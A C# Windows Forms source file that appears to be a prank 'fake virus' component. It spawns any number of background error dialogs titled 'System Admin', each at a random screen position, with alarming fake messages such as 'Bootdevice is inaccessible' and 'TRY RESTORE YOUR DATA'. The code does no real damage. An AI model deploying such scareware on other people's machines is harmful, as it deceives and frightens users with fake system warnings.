using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace YourNamespace
{
    public static class Class2
    {
        private static readonly Random rng = new Random();

        private static readonly string[] Messages =
        {
            "You must restart your computer to turn off User Account Control",
            "Turn on Virus and Protection",
            "Bootdevice is inaccessible",
            "Windows is bloated, use arch",
            "I use arch btw",
            "Enjoy ded",
            "HelloWorld('print')",
            "BSOD INCOMING",
            "YOU ARE AN IDIOT",
            "TRY RESTORE YOUR DATA"
        };

        public static void Spawn(int amount)
        {
            Thread t = new Thread(() =>
            {
                for (int i = 0; i < amount; i++)
                {
                    Thread window = new Thread(ShowWindow);
                    window.SetApartmentState(ApartmentState.STA);
                    window.IsBackground = true;
                    window.Start();
                }
            });

            t.IsBackground = true;
            t.Start();
        }

        private static void ShowWindow()
        {
            Rectangle bounds = Screen.PrimaryScreen.WorkingArea;

            int x, y;
            string msg;

            lock (rng)
            {
                x = rng.Next(bounds.Width - 330);
                y = rng.Next(bounds.Height - 160);
                msg = Messages[rng.Next(Messages.Length)];
            }

            Application.Run(new FakeError(msg, x, y));
        }

        private class FakeError : Form
        {
            public FakeError(string message, int x, int y)
            {
                Text = "System Admin";

                FormBorderStyle = FormBorderStyle.FixedDialog;
                MaximizeBox = false;
                MinimizeBox = false;
                ShowInTaskbar = false;
                StartPosition = FormStartPosition.Manual;
                Location = new Point(x, y);
                ClientSize = new Size(320, 140);

                PictureBox icon = new PictureBox();
                icon.Image = SystemIcons.Error.ToBitmap();
                icon.SizeMode = PictureBoxSizeMode.AutoSize;
                icon.Location = new Point(18, 22);

                Label label = new Label();
                label.Text = message;
                label.Location = new Point(60, 18);
                label.Size = new Size(240, 55);

                Button ok = new Button();
                ok.Text = "ACCEPT YOUR FATE";
                ok.Size = new Size(80, 28);
                ok.Location = new Point(220, 95);
                ok.Click += (s, e) => Close();

                Controls.Add(icon);
                Controls.Add(label);
                Controls.Add(ok);
            }
        }
    }
}